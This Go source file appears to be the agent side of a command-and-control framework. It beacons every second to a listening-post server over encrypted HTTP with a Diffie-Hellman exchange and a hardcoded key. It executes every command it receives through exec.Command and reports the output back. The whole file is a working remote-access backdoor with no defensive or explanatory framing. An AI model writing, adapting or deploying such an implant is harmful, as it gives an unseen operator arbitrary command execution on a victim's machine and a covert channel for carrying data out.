package main

import (
	"fmt"
	"os/exec"
	"time"

	"../crypto/dh"
	protocol "../protocol/app"
	"./comm/client"
	"./comm/layer0"
	"./comm/layer1"
	"google.golang.org/protobuf/proto"
)

type Agent struct {
	client        client.Client
	lastCommandId uint
}

func NewAgent(client client.Client) *Agent {
	return &Agent{client: client}
}

func (a *Agent) runCommand(args []string, input []byte) []byte {
	cmd := exec.Command(args[0], args[1:]...)
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("Error: %s", err)
	}
	return output
}

func (a *Agent) sendMsg(agentMsg *protocol.AgentMsg) (*protocol.LPMsg, error) {
	var lpMsg protocol.LPMsg
	msg, err := proto.Marshal(agentMsg)
	if err != nil {
		return nil, err
	}
	response, err := a.client.SendMsg(msg)
	if err != nil {
		return nil, err
	}
	err = proto.Unmarshal(response, &lpMsg)
	if err != nil {
		return nil, err
	}
	return &lpMsg, nil
}

func (a *Agent) heartbeat() {
	agentMsg := &protocol.AgentMsg{
		MsgType: &protocol.AgentMsg_GetCommandListMsg{
			GetCommandListMsg: &protocol.GetCommandListMsg{
				LastId: uint64(a.lastCommandId),
			},
		},
	}
	lpMsg, err := a.sendMsg(agentMsg)
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
	if commandListMsg := lpMsg.GetCommandListMsg(); commandListMsg != nil {
		var commandResults []*protocol.CommandResult
		for _, cmd := range commandListMsg.GetCommands() {
			fmt.Printf("Run command: %s %s\n", cmd.Args)
			cmdResult := &protocol.CommandResult{
				CommandId: cmd.GetId(),
				Output:    a.runCommand(cmd.Args, cmd.Input),
			}
			commandResults = append(commandResults, cmdResult)
			if uint(cmd.GetId()) > a.lastCommandId {
				a.lastCommandId = uint(cmd.GetId())
			}

		}
		agentMsg := &protocol.AgentMsg{
			MsgType: &protocol.AgentMsg_CommandResultListMsg{
				CommandResultListMsg: &protocol.CommandResultListMsg{
					CommandResults: commandResults,
				},
			},
		}
		_, err := a.sendMsg(agentMsg)
		if err != nil {
			fmt.Printf("Error reporting results: %s\n", err)
			return
		}
	}
}

func main() {
	targetUrl := "http://localhost:8080"
	key := []byte("some random key!")

	httpClient := layer0.NewHttpClient(targetUrl)
	encHttpClient := layer0.NewEncryptedClient(httpClient, key)
	client := layer1.NewDHClient(dh.NewKeyExchange(), encHttpClient)

	agent := NewAgent(client)

	for {
		agent.heartbeat()
		time.Sleep(1 * time.Second)
	}

}
